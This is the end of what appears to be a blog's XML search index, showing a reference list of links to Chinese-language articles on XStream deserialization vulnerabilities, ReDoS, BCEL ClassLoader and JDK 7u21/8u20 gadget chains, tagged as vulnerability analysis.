<li><a href="https://www.jianshu.com/p/387c568faf62?u_atoken=417a50b3-7283-4582-a9d6-62beb869f238&u_asession=01VRmhMh_jmS8hJUoL7NminDljZ3mXPWm-O6PYM0Uzy8-c7rjGM_5hbWbG1w6YH8RFX0KNBwm7Lovlpxjd_P_q4JsKWYrT3W_NKPr8w6oU7K_SC-EjwXkIGegmXMseTbMTh4gB_rorF7cG9vr14abfLGBkFo3NEHBv0PZUm6pbxQU&u_asig=05tEfbUPn5RoZXdCNUGkmmDRAnP42ZegzcrVKtntU-jOpfRAgGYz6QDmcjHI5C8v0xQ3r74fMUZgt7g4Iw6pdNn_mtrSBqdL-7m4RmGROTdLNMX9LJZBDXim1mfCiKnkUik3h6nTD4BTmqrYIU_R7SmWju_XFRUt0YdUrGw7Un1lP9JS7q8ZD7Xtz2Ly-b0kmuyAKRFSVJkkdwVUnyHAIJzdp6gwZs9HJDfoYwOHu1VCFkt_RHALa2RUVcHjFzRDgRU-X92pnuaZyu-ch7KXFYKu3h9VXwMyh6PgyDIVSG1W8ipRZu1JftbyI3ZAHsVJg0T51wE0Icu3q48fpuzWNti0cfra7CH_03lvhH8I743jhkDVJyujGbsCfYqnfd_6G6mWspDxyAEEo4kbsryBKb9Q&u_aref=5j0umXyV1N+IBs6SscIxywtCICY=">XStream 源码解析</a></li>
<li><a href="https://juejin.cn/post/7175164884181581883">Unsafe.allocateInstance导致jvm crash分析</a></li>
<li><a href="https://blog.csdn.net/doctor_who2004/article/details/102329237">java非静态内部类中的属性this$0</a></li>
<li><a href="https://forum.butian.net/share/507">XStream CVE-2021-21341拒绝服务漏洞漏洞分析</a></li>
<li><a href="https://www.freebuf.com/column/201766.html">正则表达式所引发的DoS攻击（Redos）</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了</a></li>
<li><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E5%AF%B9%E8%B1%A1/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8/web%E7%BB%84%E4%BB%B6/XStream/CVE-2021-29505/XStream-CVE-2021-29505-poc%E4%BF%AE%E6%AD%A3.html">XStream CVE-2021-29505 poc修正</a></li>
<li><a href="https://www.cnblogs.com/beautiful-code/p/15005485.html">7u21 与 8u20</a></li>
</ul>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
</search>
